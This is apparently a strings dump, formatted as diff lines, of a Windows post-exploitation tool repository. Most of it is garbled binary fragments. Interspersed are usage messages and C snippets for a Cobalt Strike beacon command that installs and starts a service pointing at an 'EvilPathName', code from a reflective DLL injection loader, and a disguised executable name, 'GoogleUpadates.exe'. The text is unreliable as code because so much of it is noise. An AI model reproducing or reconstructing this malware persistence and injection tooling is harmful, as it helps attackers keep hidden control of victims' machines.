+1!1>11111C2L2T2222222
+1%1.13191C1M1]1m1}1111111111111
+1/141s1x1}111111111
+1/1J1T1p1{1111111111
+101P1p11111
+101R1
+11111111111111111
+111<1A1F1a1k11111111111
+112K22222222
+131811111
+139E
+151B1G1U1@2s222
+161r111/2L2222
+171S1111D22@333
+171a1!2
+191]1111
+1>111111N22
+1@1D1H1L13
+1BALl
+1E3PEd
+1E3PeuEEEEd
+1EEP
+1FFMu
+1YYu
+1d1l1t1
+1f1111
+1h1p1x11111111111111111
+1l1p1t1111111183<3@3D3H3L3P3T3X3
+1n1z11111
+1o11111111
+2 2$2
+2 2%23222
+2 2(20282@2H2P2X2
+2'2=2S2[2566N9T9Z999999
+2)2=2R222222233455555
+2/242U2e22222
+20262@2J2]2b2233
+202P2p2
+20D0J0011
+20J5=
+212222
+212<2J2Q2W2r2y24n55
+222222
+22222222222222222
+22D3K3x3
+22w3578d99
+232>2C2H2f2p2222222222
+2622333333<4G4R4X4a44444
+292]2x22222U3
+2G2M22A3G3
+2H2e2y222Y33u44
+2J2N3
+2K2Z2a22222222
+2SS3
+2U222233]4w444444
+2Wh A
+2]E%
+2c2h22222222
+2d2l2t2
+2h2p2x22222222222222222
+3 3(30383@3H3P3X3
+3 373M33333A4U4z444455576F6e66
+3!384j4
+333333-4>4g4p4444444
+33333333
+33333333333333333
+333333333333333333333333333333333
+3333334
+33333USVWj
+3339
+333M4
+339E WWu
+33PPP
+33PPPPP.
+33PPPPPk
+33QL$
+353u3333l44444
+35<A
+35BA
+35P>A
+35XA
+35xA
+363Z3v333333333
+373B3O3d3o33333333
+383T3X3
+38] j0
+39>t
+39PE
+3<l<<<
+3=WM
+3@)M
+3@0A
+3@3P3h33333
+3@9E
+3@]j
+3AjCH
+3BS]
+3BVj(j
+3E34466777799999996:{:::::$=7=U=c=
+3GY3Au
+3G_t
+3HHE
+3MVV
+3N3W3
+3N@A
+3NPA
+3PD$
+3PP9E u:PPVWPu$
+3PPPPP
+3PPPPPy
+3PPj
+3PPuWSVPP
+3QMMMMQuWP
+3QQQPu
+3R3m33333
+3S3CH
+3SSVWh 
+3SVW
+3SVWH<
+3V!A
+3VWF
+3VWu
+3W3<4
+3W3<LA
+3WvY
+3[(]
+3[1]j
+3[L]
+3[M3
+3[O]
+3[WPS!
+3[]39
+3[]3@39
+3[]W}
+3[f]j
+3[j]
+3[v]
+3[}]
+3]AEfEUEEj
+3]}]
+3c3j3w3333334:5C5[5m555
+3d3h3l3p3t3x3
+3d3l3t3
+3dUh
+3f9:
+3f9:t
+3fEEEx
+3gVu
+3h3p3x33333333333333333
+3j X
+3o3z333
+3t)u
+3t8j
+3tVVYWWWW
+3v2!L.2
+4 4(40484@4H4P4X4
+4)4444
+4.4<4Y4a4444444
+4/'Pcq
+4/4Q4_44I5Q5c55566 777
+41<9 
+44-555S66'77888:9m99P::J=P======
+444444
+44444444444444444
+4444444444444444444
+444446666%7
+44444>>>>>>>>>>>>
+444V555555
+444b5
+4777H<h<<<<<<<<
+494j44444
+4<4l4455C66
+4=4D4Z4p4}444r555666
+4I4444
+4c4j4444444
+4c4s44444444
+4d4h4l4p4t4x4
+4d4l4t4
+4h4p4x44444444444444444
+4h4z44444444
+4j444444
+4l7p7x7
+5 5(50585@5H5P5X5
+5$5(
+5'5E5S5
+5(>A
+51O1111P234
+55266666
+5555
+555555
+585B5e5o5b:-=l=s=======
+595555
+598.969m9t9y<
+5:5D5N5
+5:5O5[5
+5=5Q555
+5=5h5555555 66=777g888
+5@=)d
+5E5R555555A6H6[66666
+5J5c555
+5K5x555B66
+5T5o57777777
+5Wg4p6=
+5h5p5x555555555
+5h5p5x55555555555555555
+5k5l6
+5p5%6666
+5s55
+5s555
+5w555555555
+5}55555
+6 6(60686
+6 6(60686@6
+6 6666666!8>8B:
+6$6666
+6'607777>8E8L8S8m8
+6'656
+6'696K6]6o66666666
+6(6@6L6P6T6p6t6666666666666666666
+6(6J6T6w666666627e77777777
+6)6f6r6}666666666
+6.656L6b6666
+606666
+66666
+66666666666666666666666666666666
+666666666666666666666666666666666
+666W7v77777h888888
+666b778
+6E6K6W6z66V7u7
+6F6h6666
+6K]_
+6S$A
+6TGv
+6d6h6l6p6t6x6
+6g66666666/7C7L7Y7
+6hPuA
+6l6x666666666
+6n16B(
+6v(PQPPESPd@
+6v(PQPPESPuG
+6v6666666
+7 727k88:9L993:
+7!7X7_7:
+7'72787A7777777
+7/787v777777777
+700WP
+707B777'8<8E8N8d8
+737>7j777
+7777
+77777777
+777777777
+77777777777
+77777777777777777777
+777777777777777777=
+77777888829O9q99L::[
+777g7v7
+778>F
+77f<<<<<<<<<<<<<
+7D7H7L7P7777777f:
+7D7}777
+7N8m8888
+7R77777N8
+7c777777
+7d7h7l7p7t7x7
+7d7j777
+7k7x77777
+8 878
+8%828s88888x999
+80t/R
+828G8]8j8x88888z999R::
+878J8f88888888
+88888
+888888
+888_:f
+89888
+8:8L8888
+8@_F4
+8E8Z8h8q888
+8G(A
+8G7A
+8WqK
+8X<<<<
+8_8888888
+8csmu%x
+8csmu4=
+8csmu4=A
+8csmu4=BA
+8i888888888 9%9
+8n888
+8p88888888 90959:9p9u9z99999996:
+8x88888888
+9$95999999999
+9/9D9I9S9X9c9n999w::::
+929U9999999999
+94@A
+94PA
+95BA
+979H9M9R9s9x99::::::::::::
+995:G:Y::
+9999999
+99999999999999999
+99999x::::o
+99:::2
+9=9X9l
+9Et!v
+9F9Q9_9f9l99999
+9c9h9m9999999
+9d9l9t9
+9r99999999
+9uuE
+9wLt
+9}s@t5u
+: :%:
+:(:U::::::::
+:0:p:::::::
+:5:P:s:::::
+:8:Y:k:}:::
+::::::::::::::
+:::::s
+::>:B:F:
+:=:C:I:O:U:[:b:i:p:w:
+:@:g:p:u:z:::::::::!
+:F:y:
+:H::
+:N:Z:_:d:::::::::
+:U:a:m:y:::0
+:YM3_
+:cG@L
+:g:::<<
+:tYtQ
+< <$<(<4<<<@<D<H<L<==================
+< t1<
+<!<4<@<P<a<<<<<<<
+<$Xf
+<(wXC=sF
+<-<y<<<<<<
+</Filter>
+</Project>
+</assembly>
+<1D1P1T1X1
+<2=u
+<3D3L3T3
+<4<8<X<x<<<<<<
+<4<<<
+<8<k<
+<<(=P>
+<<7==F>P>>B
+<<<<<<<<<<<<'=7=N=V=}======='>K>g>r>w>
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+<<<<<<<@=j=r=====>>1
+<<<<G>G
+<<>=P=======
+<<z==>>>>>>
+<B<<<<
+<C<=>>
+<G<<==
+<V7w8=O
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+<d<h<l<p<t<x<
+<g<p<u<<<<<<<<
+<h<<<<<<<<<<<
+= ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) 
+= (DEREF_16(uiNameOrdinals) 
+= (DWORD)(dwAddress 
+= (DWORD)uiLibraryAddress
+= (WORD)((dwInstruction 
+= =@=
+= HIWORD(uiLibraryAddress)
+= LOWORD(uiLibraryAddress)
+= s[t]
+= sizeof(DWORD)
+= sizeof(IMAGE_IMPORT_DESCRIPTOR)
+= sizeof(IMAGE_RELOC)
+= sizeof(IMAGE_SECTION_HEADER)
+= sizeof(ULONG_PTR)
+= sizeof(WORD)
+= uiLibraryAddress
+=$<A
+=%=-==H>0
+=(<A
+=(=3=@=R===7>L>U>
+=-=4=:=L=V=====
+=0=====>>>
+=0=====E>>>p
+=0=P=X=
+=3=Z=b={======
+=7=E=L=R=d=v={====u>>>>
+=7=I=========
+=:======
+=<=O==
+======K>R>e>>>>>>>>
+=H=Y=t=======
+=J=Z==
+=J=d=====
+=K=g=========A>M>>>>
+=Rich
+=W=q=========
+=d=h=l=p=================
+=d>w>>>
+=l=====
+=x======
+={=======
+> >'>3>F>K>W>
+>!>)>4>:>E>K>Y>>>>>>>
+>%>->>
+>'>=>G>f>>>
+>(>H>h>>>>>
+>0>8>P>V>}>>>>>>
+>1>h>>>C
+>8>X>x>>>>>
+><>>j
+><>M>
+>>>>
+>>>>>
+>>>>>>
+>>>>>>>
+>>>>>>>>>
+>>>>>>>>>>>>>>>>>
+>F>a>m>
+>I>W>b>x>>>j
+>Z>>>p
+>d>>-
+>d>l>t>
+>m>>>>>A
+>p>>>>>>
+>t7A
+@( tj
+@-32
+@.data
+@.reloc
+@.rsrc
+@1P1T1X1d1h1l11111111034383<3@3D3H3L3P3T3X3
+@5wz
+@=D=H=L=====================
+@A$y
+@A(y
+@ABCDEFGHIJKLMNOPQRSTUVWXYZ[
+@H5A
+@abcdefghijklmnopqrstuvwxyz[
+@hXh
+@hhA
+@jPEVP
+@t3t6
+@t9F
+@tJ=7A
+@tJ=A
+@zbj
+A A$A(fA0A8A<@
+A.lzZ
+A0M=
+A1 t-
+A1<Fu
+A3PPPPP
+A3PPPPPG
+A98u
+A<Zw
+A=$<A
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+ABCDEFGHIJKLMNOPQRSTUVWXYZ{
+ADVAPI32.dll
+ARSF(
+ARSF(h
+AYjPj
+AZ I
+Administrator
+April
+AuVSYYt(
+AuVSYYt(l
+August
+B$Pl
+B(EG
+B3u}
+B:t6t:t't
+BOOL AddResource(char
+BOOL Reset = GetLastError()
+BOOL SetServiceStatus(DWORD dwServiceCode) {
+BOOL SystemServiceOperate(char
+BOOL bRet = FALSE
+BOOL bRet = TRUE
+BOOL bReturnValue = TRUE
+BYTE bBeingDebugged
+BYTE bInheritedAddressSpace
+BYTE bReadImageFileExecOptions
+BYTE bSpareBool
+BeginUpdateResourceA
+BncW[5
+B}]9
+C9]vQ}
+CREATESERVICEDLL_EXPORTS
+C]-H
+Cg][
+CloseHandle
+CloseServiceHandle
+CloseServiceHandle(shSCManager)
+CloseServiceHandle(shService)
+CompareStringEx
+CompareStringW
+ControlService
+CorExitProcess
+CreateFileW
+CreateMutexA
+CreateProcessA
+CreateService
+CreateService-master
+CreateService.pdb
+CreateServiceA
+Ct>D
+CuWht
+CuWhtA
+D$(X
+D$0X
+D0(t
+D1uj
+DEREF(uiValueA) = (uiLibraryAddress 
+DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
+DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
+DWORD ThreadId
+DWORD dwAtlThunkSListPtr32
+DWORD dwEnvironmentUpdateCount
+DWORD dwErrorCode = 0
+DWORD dwGdiDCAttributeList
+DWORD dwGdiHandleBuffer[34]
+DWORD dwHashValue
+DWORD dwHeapDeCommitFreeBlockThreshold
+DWORD dwHeapDeCommitTotalFreeThreshold
+DWORD dwHeapSegmentCommit
+DWORD dwHeapSegmentReserve
+DWORD dwImageProcessAffinityMask
+DWORD dwImageSubsystem
+DWORD dwImageSubsystemMajorVersion
+DWORD dwImageSubsystemMinorVersion
+DWORD dwInitialized
+DWORD dwLength
+DWORD dwMaximumNumberOfHeaps
+DWORD dwMinimumStackCommit
+DWORD dwNtGlobalFlag
+DWORD dwNumberOfHeaps
+DWORD dwNumberOfProcessors
+DWORD dwOSMajorVersion
+DWORD dwOSMinorVersion
+DWORD dwOSPlatformId
+DWORD dwSessionId
+DWORD dwSize
+DWORD dwSystemReserved
+DWORD dwTlsBitmapBits[2]
+DWORD dwTlsExpansionBitmapBits[32]
+DWORD dwTlsExpansionCounter
+Data[l] 
+Debug
+December
+DecodePointer
+DeleteCriticalSection
+DeleteService
+DeleteService(shService)
+Desktop
+E N1xt
+E38]
+E3D$
+E3EE
+E3HHEP
+E3W}
+E3]j
+E5Genu
+E9Erf}
+E=BA
+EAEfEEj
+EE h
+EE3j
+EEE A
+EEE7A
+EEEEEPRYY]j
+EEEP5BA
+EEPVYY
+EEPV}YY
+EEPj
+EEuE
+EE}{
+EGPQu
+EGWVj
+EH<A
+EK2A
+EMvI
+EPD]
+EPEP6
+EPEPw
+EPQEPEj
+EPQQ
+EPR8
+EPR>X
+EPRK
+EPSz
+EPW}
+EPZ]
+EPeuEEEEd
+EPh4@
+EPpF
+EPp]
+EPv8
+EQQj
+ESPT
+ESPk:
+ESVW
+ESVWh
+ESVWu
+ESVu
+ETW0
+EU=}
+EUEM
+EVPu(Y
+EVWht
+EVWhtA
+EV_/
+EVh82
+EVh@
+EVh@2
+EVh@2A
+EVh@@
+EVhH2
+EVhH2A
+EVhH@
+EVhP2
+EVhP2A
+EVhP@
+EVhX2A
+EVhX@
+EVht2
+EVnt'u(u$u u
+EVs C
+EVt'u(u$u u
+EVt5
+EWPB
+EWPH
+EX @$
+EY5 A
+EY5=A
+EYYDz
+EYYtN
+EYYxH9
+EZ%qVJ
+E[M_3
+E]B.4o
+EndGlobal
+EndGlobalSection
+EndProject
+EndUpdateResourceA
+EnterCriticalSection
+Ep x$
+Et!H
+Et4P
+Et4PjYt
+Et7j
+EtMME
+EtTWt
+EuE@
+EuVRY_
+EuVpY_
+Eu]M3
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+ExH3A
+ExitMainViaCRT
+ExitProcess
+ExitProcess(0)
+E}PE}PWWS
+F P2
+F P7
+F PBA
+F1<at
+F1<gt
+F1PF
+F1Pv
+F1sz
+F480t
+F8F<
+F<D0x
+FEMh
+FGIu
+FGIu$
+FGNO
+Fd}=ht
+February
+Ffu[Jj
+FileName
+FindClose
+FindFirstFileExA
+FindNextFileA
+FindResourceA
+Fj0X
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+FlushFileBuffers
+FreeEnvironmentStringsW
+FreeLibrary
+Friday
+FuFu(Ej
+G 8NhU]i<
+G=5F=
+GCTL
+GET$
+GETPROCADDRESS pGetProcAddress = NULL
+GFEt
+GH55A
+GLP0
+GetACP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetConsoleCP
+GetConsoleMode
+GetCurrentPackageId
+GetCurrentProcess
+GetCurrentProcessId
+GetCurrentThreadId
+GetEnvironmentStringsW
+GetFileType
+GetLastError
+GetModuleFileNameA
+GetModuleFileNameW
+GetModuleHandleExW
+GetModuleHandleW
+GetOEMCP
+GetProcAddress
+GetProcessHeap
+GetStartupInfoW
+GetStdHandle
+GetStringTypeW
+GetSystemTimeAsFileTime
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+GoogleUpadates.exe
+GuVhh
+GuVht
+GuVhtA
+H3'Uh
+H3Uh
+HH:mm:ss
+HINSTANCE hAppInstance = NULL
+HLMMQPDEYY
+HPXF F
+HPq4
+H[=J6RMq!
+HeapAlloc
+HeapFree
+HeapReAlloc
+HeapSize
+HideSolutionNode = FALSE
+HuYUW=$<A
+HuYUW=DA
+HuYWVt$
+H}UME
+I0N(
+IYYu
+InitializeCriticalSectionAndSpinCount
+InitializeCriticalSectionEx
+InitializeSListHead
+InterlockedFlushSList
+InvokeMainViaCRT
+IsDebuggerPresent
+IsProcessorFeaturePresent
+IsValidCodePage
+ItOLt>Tt-h
+J<A=
+JE}PV
+JE}PV/
+JE}PVC
+January
+July
+June
+Jut_
+KERNEL32.dll
+L!8X
+L!This program cannot be run in DOS mode.
+LARGE_INTEGER liCriticalSectionTimeout
+LCMapStringEx
+LCMapStringW
+LIST_ENTRY HashTableEntry
+LIST_ENTRY InInitializationOrderModuleList
+LIST_ENTRY InLoadOrderModuleList
+LIST_ENTRY InMemoryOrderModuleList
+LOADLIBRARYA pLoadLibraryA = NULL
+LPSTR
+LPVOID lpActivationContextData
+LPVOID lpAnsiCodePageData
+LPVOID lpAppCompatInfo
+LPVOID lpEntryInProgress
+LPVOID lpFastPebLockRoutine
+LPVOID lpFastPebUnlockRoutine
+LPVOID lpGdiSharedHandleTable
+LPVOID lpImageBaseAddress
+LPVOID lpKernelCallbackTable
+LPVOID lpLoaderLock
+LPVOID lpMutant
+LPVOID lpOemCodePageData
+LPVOID lpPostProcessInitRoutine
+LPVOID lpProcessAssemblyStorageMap
+LPVOID lpProcessHeap
+LPVOID lpProcessHeaps
+LPVOID lpProcessParameters
+LPVOID lpProcessStarterHelper
+LPVOID lpReadOnlySharedMemoryBase
+LPVOID lpReadOnlySharedMemoryHeap
+LPVOID lpReadOnlyStaticServerData
+LPVOID lpSsHandle
+LPVOID lpSubSystemData
+LPVOID lpSystemAssemblyStorageMap
+LPVOID lpSystemDefaultActivationContextData
+LPVOID lpTlsBitmap
+LPVOID lpTlsExpansionBitmap
+LPVOID lpUnicodeCaseTableData
+LPVOID lppShimData
+LPVOID pBuffer = LockResource(hGlobal)
+LSu!E
+LVW7
+LeaveCriticalSection
+LoadLibraryExW
+LoadResource
+LocaleNameToLCID
+LockResource
+M u(Eu$u u
+M32]
+M33tUE
+M3UM1L
+M3UMqM
+M3X]
+M3[/]
+M3[@]
+M3[F]
+M3[]
+M3[_3
+M3[h]
+M3[o]
+M3[p]
+M3[r@]
+M3_3
+M3_]
+M3_v]
+M3_y]
+M4E39
+M90A
+M9HA
+M<<<
+ME3M3M3
+MEEEPu
+MEPj
+MEineIE5ntel
+MEjA
+MM/dd/yy
+MPQR
+MPQR%
+MPQRy
+MQP6
+MQPEPu
+MQPM
+MQPaM
+MQWPV
+MSVWu
+MUEu
+MVUz
+M[_3
+Main Invoked.
+Main Returned.
+March
+Microsoft.CRTProvider
+MinimumVisualStudioVersion = 10.0.40219.1
+Monday
+Mp=A
+MpE39
+MtUE
+Mu< t
+MuQVWSj
+MultiByteToWideChar
+MyFunc()
+N @@F4V4
+N(@)
+N(@F
+N({F(
+N1F<
+N4N4
+NAN(IND)
+NAN(SNAN)
+NDEBUG
+NI9M
+NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL
+November
+OMEfyfxW
+Ob{!@f
+October
+OpenSCManagerA
+OpenServiceA
+P Y8W5hA
+P%YFD
+P' }
+P(RP$R
+P/YFD
+P1YtI
+P2Y]
+P39-
+P3}-Q
+P4g3
+P5BA
+P5PPZPj
+P6M9
+P6MEY
+P6T6X6
+P76j
+P7EE
+P7YF@
+P9B4
+P=YF
+PAYF@
+PDPE=7
+PDYF4
+PE/j
+PE<YYtGu
+PEPB
+PEPq
+PEYYtGu
+PEvj
+PF8SP:
+PF8SPI.
+PF8j
+PFhj
+PIPPnPj
+PIYF<
+PN3GYYE
+POYF
+PP'Pj
+PP0SP
+PPEB_FREE_BLOCK pFreeList
+PPEB_LDR_DATA pLdr
+PPPPj
+PPSh
+PQ5A
+PQ5h
+PQ5l
+PQYYt
+PQh1A
+PQh2A
+PQiYYt
+PROCESSOR_REVISION
+PROCESS_INFORMATION pi
+PRPQh
+PRTL_CRITICAL_SECTION pFastPebLock
+PSP8
+PSRV
+PSRVU
+PSUU
+PSYF<
+PS]K
+PSeu
+PUxYu
+PVOID DllBase
+PVOID EntryPoint
+PVSy
+PVYF0
+PWEH
+PWPQ
+PWPj
+PWSTR pBuffer
+PY0V5hA
+PY8W50A
+PYF 
+PYF0
+PYF4
+PYF<
+PYF@
+PYFD
+PYFH
+PYFL
+PYYte
+PYYu
+PYtE
+PYtI
+P[YF8
+P]YYte
+PaYF
+PbYtE
+PbuIhd
+Pc3@
+Pdb3
+PeYF8
+PfPPPj
+PhYF
+PjYE
+PmYF$
+PsYF
+Pu$u Vu
+Pu$u Wu
+PuEPH
+PuIhd
+PuQhd
+Puu u
+Pv8H
+PvYYV
+PwYF$
+PyYt
+PzYF
+P}h3@
+Q00000000
+Q0h%
+Q>YE
+QNAN
+QS/8
+QS3K
+QSuW
+QhBC .=
+QueryPerformanceCounter
+R<$tLD$
+RQMQu
+RQt$
+RSDS
+RTTI
+RYYv
+RaiseException
+ReflectiveDLLInjection-code
+ReflectiveDLLInjection-master
+ReflectiveLoader@@YGKPAX@Z
+RegisterServiceCtrlHandlerA
+Release
+RhB4
+RtlUnwind
+S0Y_[]
+S1Y_[]
+SERVICE_ACCEPT_PAUSE_CONTINUE
+SERVICE_STATUS sStatus
+SERVICE_STATUS ss = { 0 }
+SERVICE_STATUS_HANDLE g_ServiceStatusHandle = 0
+SERVICE_TABLE_ENTRY stDispatchTable[] = {
+SERVICE_WIN32_OWN_PROCESS 
+SHORT LoadCount
+SHORT TlsIndex
+SNAN
+SPH8
+SPLK
+SQp0A
+SQpA
+STARTUPINFO si = { sizeof(si) }
+SV(G
+SV0X
+SVW3
+SVW3F
+SVWD$
+SVWF
+SVWW
+SVWu
+SVa8
+SVeK
+SVj73SS
+SVxL
+SV{A
+SW5A
+SYYt
+SYYu
+SY_[]
+Saturday
+September
+SetEnvironmentVariableA
+SetFilePointerEx
+SetLastError
+SetServiceStatus
+SetServiceStatus(SERVICE_CONTINUE_PENDING)
+SetServiceStatus(SERVICE_PAUSED)
+SetServiceStatus(SERVICE_PAUSE_PENDING)
+SetServiceStatus(SERVICE_RUNNING)
+SetServiceStatus(SERVICE_START_PENDING)
+SetServiceStatus(SERVICE_STOPPED)
+SetServiceStatus(SERVICE_STOP_PENDING)
+SetStdHandle
+SetUnhandledExceptionFilter
+Sh<v
+ShuA
+SizeofResource
+Sk0V
+Sleep
+Sleep(5000)
+SolutionGuid = {BEA73D34-EBF1-4A18-8EE3-752CA93CBAC5}
+StartServiceA
+StartServiceCtrlDispatcher(stDispatchTable)
+StartServiceCtrlDispatcherA
+Sunday
+SystemFunction036
+T$4t
+T@b ==
+TVhX2
+T[M_3
+TerminateProcess
+Thursday
+TlsAlloc
+TlsFree
+TlsGetValue
+TlsSetValue
+TransitEXE.exe
+TransitEXE.exe C:
+TransitEXE.pdb
+Tuesday
+U SVW3}}}}}}}u
+U T$
+U$<A
+U0SVW}
+U5j%5
+U=t2
+U=t6
+UC=DA
+UEH9E
+UE]ME
+UHEP
+ULARGE_INTEGER liAppCompatFlags
+ULARGE_INTEGER liAppCompatFlagsUser
+ULONG Flags
+ULONG SizeOfImage
+ULONG TimeDateStamp
+ULONG_PTR uiAddressArray
+ULONG_PTR uiBaseAddress
+ULONG_PTR uiExportDir
+ULONG_PTR uiHeaderValue
+ULONG_PTR uiLibraryAddress
+ULONG_PTR uiNameArray
+ULONG_PTR uiNameOrdinals
+ULONG_PTR uiValueA
+ULONG_PTR uiValueB
+ULONG_PTR uiValueC
+ULONG_PTR uiValueD
+ULONG_PTR uiValueE
+UNICODE_STR BaseDllName
+UNICODE_STR FullDllName
+UNICODE_STR usCSDVersion
+UPjh-@
+UPjh@6
+UQ3M
+UQ3Vu
+UQ7A
+UQDA
+UQEPj
+UQHLMMQP
+UQHLMMQP[EYY
+UQPXY]Y[
+UQQ3!EfE}=DA
+UQQ33fEM}=DA
+UQQE
+UQQM
+UQQS
+UQQSV
+UQQSVWN@
+UQQSVW}
+UQQSWj0j@
+UQQSWj0j@D3
+UQQVWN 
+UQQVW}
+UQQVu
+UQQe
+UQQ}M
+UQSV3C3
+UQSVMWj
+UQSVW
+UQSVu
+UQVEA
+UQVEp
+UQVW
+UQVWm
+UQVu
+UQW}
+URPQQh
+URPQQh3
+USHORT Length
+USHORT MaximumLength
+USHORT usCounter
+USVW=
+USVW= A
+USVW==A
+USVWN@
+USVWUj
+USVu
+UUEK
+UV39u
+UV5!
+UV6 
+UV6y
+UVW'
+UVWS33333[_
+UVWu
+UVW}
+UVh@
+U]DUV3PPPPPPPPU
+U]UQQSWj0j@3
+U]U]
+U]]j
+U]h(@
+U]jj
+Ucsm9E
+UnhandledExceptionFilter
+UpdateResourceA
+Users
+V 3WfEE
+V$Ye
+V0Px1
+V1YuE
+V3@A
+V3PA
+V3WWS
+V3YaSSSSS
+V5<A
+V5BA
+V7C9
+V7PA
+V7aH
+V:MYu
+VGY}
+VIRTUALALLOC pVirtualAlloc = NULL
+VP5 <A
+VP5(
+VP5@A
+VPpR
+VSEYY
+VSoEYY
+VUYE
+VVYY
+VW3!
+VW3!A
+VW3@
+VW<A
+VWN@
+VWPbc
+VWPj
+VWX>A
+VWhA
+VWj=S
+VWj=S6u
+VWj=SJg
+VWuSu
+VYY]
+VY_Hu
+VYaSSSSS
+VY}E
+VeVX
+VhBA
+VhL@
+VisualStudioVersion = 14.0.25123.0
+Vp0t
+VuG9E
+VyY5A
+V{YaSSSSS
+W(_M3<]UL
+W(_M3_]3PPPh
+W)Yu
+W1Yu
+W36A
+W3f9:t!V
+W3tVE
+W50A
+W5hA
+W:(_M3]UL
+W=$A
+W==A
+W@>A
+WEP'
+WEP-
+WEPs
+WIYt!E
+WN(_M3]3PPPh
+WORD
+WORD wOSBuildNumber
+WORD wOSCSDVersion
+WP5BA
+WPWPW
+WPWPh
+WPbL
+WRzY
+WSOut5u
+WS}u
+WUY_
+WV)Y
+WV55
+WVMY
+WVPs
+WVSL
+WVSQ
+WVSY
+WVU33D$
+WVa{
+WVhtA
+WVt$
+WWSuj
+WWWPWS
+Wednesday
+WhBA
+WhtA
+WideCharToMultiByte
+Win32
+Wj0V
+Wj0Vp
+Wj0XPV
+Wj0XPVE
+Wk(_M3]3PPPh
+Wp<A
+WriteConsoleW
+WriteFile
+Wt<E
+Wv4F<
+X } 
+X!8d
+X/4B
+X9Er}
+XM3[
+XM3[S]
+XP:M
+XPPE
+XPRE
+XPuE
+XYSV_
+X]3@]j
+X]fM
+Y$Vu
+Y)9A
+Y)Vj
+Y-Lt)t%C
+Y3Ss
+Y55A
+Y@H0
+Y@H3A
+Y@H8A
+YEY] 
+YM3.H]3PPPPP
+YM3J]3PPPPP_
+YM3_.]
+YM3_]
+YM8]u
+YM_3
+YPXL
+YQL$
+YUVu
+YY J
+YY3j
+YYBA
+YYDz
+YYE=M
+YYM_3
+YY]h5A
+YY]hh
+YY]hpA
+YY]{
+YY_F8
+YYcE
+YYh!A
+YYh@
+YYhx!
+YYqj
+YYt$}
+YYt0WuV
+YYt0WuV=
+YYt5A
+YYt5j
+YYt@}
+YYtGu
+YYte
+YYtm]R
+YYu)
+YYu3
+YYuE
+YYuJA
+YYuJE
+Y_U}
+YfEm}fE3
+YhvA
+YjPj
+Yp<E
+Yt.u
+YtVWj
+Yu5A
+YuBA
+YuPA
+YuV6
+Yue=DA
+YupA
+YuwHu
+YuwHu]
+Y}VY
+ZY4A
+[%<!A
+[%<@
+[%@!
+[3uj
+[M3A]
+[M3WA]
+[M3]u u
+[M3a]u u
+[M3{]
+[SV(
+[SV{A
+[WVj
+[]3E
+[]3PPPPP
+[]QU%$<A
+[]QU%DA
+[]UE
+[]US]
+[]UWVSM
+[]Ujh
+[]Ujh 
+[]Ujh@
+[]Ul$
+[]Wu
+[]ho @
+[_V 
+[_Vy
+[_]3PPPPP
+[_]3PPPPPi
+[aOni
+[hK@
+[h]r@
+[t%F0
+[uvN
+] CreateService by Uknow
+] EvilPathName: %s
+] EvilPathName: C:
+] ServiceName: %s
+] ServiceName: test
+] Success! Service successfully Create and Start.
+] Success! Service successfully Stop and Delete.
+] Tasked beacon to spawn CreateService ....
+] TransitPathName: %s
+] TransitPathName: C:
+] Wrong number of parameters!
+] arguments are:C:
+] eg: %s 
+] eg: CreateService c:
+] received output:
+] usage: %s TransitPathName EvilPathName ServiceName start/stop
+] usage: CreateService TransitPathName EvilPathName ServiceName start/stop
+]%< A
+]%@ 
+]%@@
+]%l A
+]%l@
+]%t 
+]33@
+]3PPPPP
+]3PPPPP@
+]3PPj
+]E]Eu
+]SVWT$
+]SVj
+]SlY
+]Stu
+]Su$M
+]U SVW3E
+]UE(tjM
+]UQQ
+]UVh
+]UVh@
+]UVu
+]UWVSM
+]VD$
+]VPj
+]VxY
+]WWWuVuSu
+]YY]
+]]EEwPr
+]]S >
+]]SYu
+_1Uj
+_33[]
+_33[]VpAu
+_3PPj
+_81EPEPE
+_=fM3
+_CONSOLE
+_DEBUG
+_S A
+_SV3QSSSSj7SS
+_U JW
+_USRDLL
+_WINDOWS
+_[M3
+_[WVt$
+_[]$
+_[]UVhx@
+_[]Vu
+_[h_4
+_[uu
+_]%ttV4YtVWj
+_]3PPPPP
+_]3PPPPPX
+_]_tVYtVWj
+_]rtV
+__based(
+__cdecl
+__clrcall
+__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress()
+__eabi
+__fastcall
+__forceinline DWORD hash(char
+__forceinline DWORD ror(DWORD d)
+__pascal
+__ptr64
+__restrict
+__stdcall
+__thiscall
+__unaligned
+__vectorcall
+_cabs
+_hypot
+_logb
+_nextafter
+_w[R/
+abcdefghijklmnopqrstuvwxyz
+abcdefghijklmnopqrstuvwxyz{
+acos
+argv[c] = strtok((char
+asin
+asmx</Extensions>
+atan
+atan2
+b>==
+bYYu
+beacon.exe
+beacon.exe test start
+beacon.exe test stop
+beacon> CreateService C:
+beacon_command_register(
+bi@t
+bi@t 
+break
+bu$Eu u
+c = 0
+cRichq
+cYYu
+case 0:
+case 1:
+case 2:
+case 3:
+case DLL_PROCESS_ATTACH:
+case DLL_PROCESS_DETACH:
+case DLL_QUERY_HMODULE:
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case SERVICE_CONTROL_CONTINUE:
+case SERVICE_CONTROL_PAUSE:
+case SERVICE_CONTROL_STOP:
+ceil
+char
+char Path[256] = {}
+char filename[MAX_PATH] = { 0 }
+char tmp = 0
+copy constructor closure'
+cosh
+d1(_
+dNj5
+d]u u
+default constructor closure'
+default:
+define ARM_MOVT
+define ARM_MOVW
+define ARM_MOV_MASK
+define ARM_MOV_MASK2
+define DEREF( name )
+define DEREF_16( name )
+define DEREF_32( name )
+define DEREF_64( name )
+define DEREF_8( name )
+define DLLEXPORT   __declspec( dllexport ) 
